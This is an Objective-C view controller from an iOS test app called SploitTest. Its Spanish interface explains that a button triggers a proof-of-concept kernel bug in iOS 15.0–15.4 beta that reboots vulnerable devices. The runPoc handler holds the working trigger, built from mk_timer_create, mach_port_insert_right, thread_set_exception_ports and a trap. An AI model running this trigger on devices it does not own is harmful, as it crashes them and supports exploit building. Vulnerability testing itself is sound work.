//
//  ViewController.m
//  SploitTest
//
//  Created by GeoSn0w on 3/18/22.
//  Non-profit translated by realrodri on 3/27/22
//

#import "ViewController.h"
#include <mach/mach.h>
#include <pthread.h>
#include <mach/mach_time.h>
#include <unistd.h>

extern mach_port_name_t mk_timer_create(void);

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (void)viewDidAppear:(BOOL)animated {
    UIAlertController * alertvc = [UIAlertController alertControllerWithTitle: @ "Instrucciones"
                                     message: @"Pulsa el botón \"Ejecutar PoC\". Si el dispositivo es VULNERABLE, se REINICIARÁ solo. Si no ocurre nada, es probable que el dispositivo no sea vulnerable. Esta vulnerabilidad debería funcionar desde iOS 15.0 hasta 15.4 Beta 1, pero NO FUNCIONARÁ en la versión 15.4 ni en las betas más recientes.\n\nCabe decir que esto es un PoC (Proof of Concept). No es ni un exploit ni una herramienta para hacer jailbreak. Simplemente te da la garantía de que en un futuro, un jailbreak hecho a raíz de este código funcionará." preferredStyle: UIAlertControllerStyleAlert
                                    ];
      UIAlertAction * action = [UIAlertAction actionWithTitle: @ "Entendido"
                                style: UIAlertActionStyleDefault handler: ^ (UIAlertAction * _Nonnull action) {
                                  
                                }
                               ];
      [alertvc addAction: action];
      [self presentViewController: alertvc animated: true completion: nil];
}

- (IBAction)runPoc:(id)sender {
    int p = mk_timer_create();
    mach_port_insert_right(mach_task_self(),p,p,20); pthread_t t;
    pthread_create(&t,0,C,&p);
    for(;;);
}
void *C (void* a){
    thread_set_exception_ports(mach_thread_self(), EXC_MASK_ALL,*(int *)a,2,6);
    __builtin_trap();
    return a;
}

- (IBAction)GitHub_Geo:(UIButton *)sender {
    [[UIApplication sharedApplication] openURL: [NSURL URLWithString:@"https://github.com/GeoSn0w"]];
}

- (IBAction)GitHub_rodri:(UIButton *)sender {
    [[UIApplication sharedApplication] openURL: [NSURL URLWithString:@"https://github.com/realrodri"]];
}


@end
